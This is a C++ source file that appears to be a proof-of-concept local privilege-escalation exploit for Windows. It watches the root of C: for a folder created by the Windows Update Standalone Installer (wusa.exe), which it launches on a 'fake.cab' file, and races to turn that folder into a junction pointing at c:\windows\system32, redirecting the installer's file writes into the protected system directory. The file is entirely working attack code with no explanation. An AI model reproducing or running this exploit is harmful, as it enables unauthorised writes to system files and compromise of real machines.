#include "stdafx.h"
#include "ReparsePoint.h"
#include <iostream>

using namespace std;


void WatchDirectory()
{

	LPCWSTR filename1;
	LPCWSTR root = L"c:\\";
	HANDLE hDir = CreateFile(
		L"c:\\",
		FILE_LIST_DIRECTORY,
		FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS,
		NULL
	);

	FILE_NOTIFY_INFORMATION strFileNotifyInfo[1024];
	DWORD dwBytesReturned = 0;




		ReadDirectoryChangesW(hDir, (LPVOID)&strFileNotifyInfo, sizeof(strFileNotifyInfo), TRUE, FILE_NOTIFY_CHANGE_DIR_NAME, &dwBytesReturned, NULL, NULL);
		wcout << _T("Folder Created: ") << strFileNotifyInfo[0].FileName << endl;
		filename1 = strFileNotifyInfo[0].FileName;

		std::wstring df = std::wstring(root) + filename1;
		LPCWSTR dfc = df.c_str();

		HANDLE hJunction = CreateFile(dfc, GENERIC_READ | FILE_WRITE_DATA,
			FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
				nullptr);
		ReparsePoint::CreateMountPoint(hJunction, L"c:\\windows\\system32", L"");

	
}

DWORD WINAPI Thread1(LPVOID lpParam)
{

	Sleep(100);
	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k wusa c:\\users\\%username%\\downloads\\fake.cab", 5);
	return 0;
}

int _tmain()
{
	CreateThread(NULL,0,Thread1,NULL,0,NULL);  

	WatchDirectory();
	return 0;
}

